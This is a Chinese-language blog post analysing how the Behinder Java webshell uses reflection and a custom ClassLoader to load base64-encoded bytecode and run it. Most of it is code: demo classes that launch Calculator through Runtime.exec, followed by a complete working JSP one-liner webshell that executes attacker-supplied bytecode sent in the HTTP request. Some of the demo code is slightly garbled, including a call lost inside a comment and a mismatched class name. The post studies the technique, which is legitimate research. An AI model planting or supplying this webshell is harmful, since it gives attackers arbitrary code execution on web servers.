JavaWebshell 浅析

主要通过behinder的webshell,加强一下反射的理解。
作者原文：https://www.cnblogs.com/rebeyond/p/10916001.html

主要思路：

​ 通过反射调用Classloader#defineclass(),加载自定义的字节码实现。

一个DEMO:

​ 首先写一个继承了ClassLoader的类，然后通过调用父类的defineClass方法，传入用户自定义的字节码数组

UDF.java

package com.demo.webshell;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import com.sun.xml.internal.rngom.parse.host.Base;
import sun.misc.BASE64Decoder;

import java.io.*;

public class UDC {

    public static  class  Myloader extends ClassLoader{
        public Class get(byte[] b){
          return  super.defineClass(b,0,b.length);
        }


    }
    public static String Base64D() throws IOException {
        File file = new File("/Users/qqqq/IdeaProjects/javaPro/target/classes/com/demo/webshell/evil.class");
        InputStream in = new FileInputStream(file);
        byte[] buffer = new byte[(int)file.length()];
        in.read(buffer);;
        in.close();
        String classStr= Base64.encode(buffer);
        return classStr;

    }
    public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        String classStr = Base64D();
        BASE64Decoder code=new sun.misc.BASE64Decoder();
        Class result=new Myloader().get(code.decodeBuffer(classStr));
        System.out.println(result.newInstance());
    }


}

​ 传入的evil.java

​ 这里是将在newInstance的时候调用的代码写在代码块中

​ 在newInstance是，调用先后顺序：静态代码块 > 代码块 > 构造函数

package com.demo.webshell;

import java.io.IOException;

public class evil {
    {
        try {
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

​ 作者在文中提到，为了服务端代码精简一点，通过重写Object#toString方法来调用恶意代码，这样就避免了用户自定义方法，稍微减少代码量。

​ 所以evil.java中可以改进下

package com.demo.webshell;

import java.io.IOException;

public class evil {
   @Override
		public String toString() {
    // TODO Auto-generated method stub
    try {
        Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    return "OK";
}
}

​ 当重写toString来构造payload时，有一个非常明显的弊端就是执行的命令是固定的，每次执行不同的代码都要重新编写一次代码。

​ 所以就考虑在Object中找一个能够传入参数的方法，主要关注equals方法

public boolean equals(Object obj) {
    return (this == obj);
}

​ 可以看到，equals传入的是参数类型是Object，返回值类型是布尔。又因为Object是所有类的基类，所以可以传入任何类型的对象。

​ 所以最终重写的方法为equals(),evil.java为：

package com.demo.webshell;

import java.io.IOException;

public class evil {
   @Override
		    public boolean equals(Object obj) {
		    
        return (this == obj);
        
    }

}

最终实现的UDC.java为

package com.demo.webshell;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import sun.misc.BASE64Decoder;
import java.io.*;

public class UDC {
    public static  class  Myloader extends ClassLoader{
        public Class get(byte[] b){
          return  super.defineClass(b,0,b.length);
        }
    }
    public static String Base64D() throws IOException {
        File file = new File("/Users/qqqq/IdeaProjects/javaPro/target/classes/com/demo/webshell/evil.class");
        InputStream in = new FileInputStream(file);
        byte[] buffer = new byte[(int)file.length()];
        in.read(buffer);;
        in.close();
        String classStr= Base64.encode(buffer);
        return classStr;
    }
    public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        String classStr = Base64D();
        System.out.print(classStr.length());
        BASE64Decoder code=new sun.misc.BASE64Decoder();
        Class result=new Myloader().get(code.decodeBuffer(classStr));//将base64解码成byte数组，并传入t类的get函数              System.out.println(result.newInstance().equals("/System/Applications/Calculator.app/Contents/MacOS/Calculator"));
    }
  }
}

​ 最终的jsp一句话为：

<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("pass")!=null)new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())).newInstance().equals(pageContext);%>

​ 为了解决ClassLoader的不同，需要重写classloader构造方法，传入指定的classloader。然后在这边是通过pageContext来获取上下文中的request对象，传入equals参数来执行任意命令。

总结

以上大致就是behinder通过反射加载字节码来进行命令执行的分析，没有加密解密功能进行分析。

但是不知道在各种环境，如Tomcat、Spring、weblogic中是获取request的方式是否类似，上下文的获取是否一致。
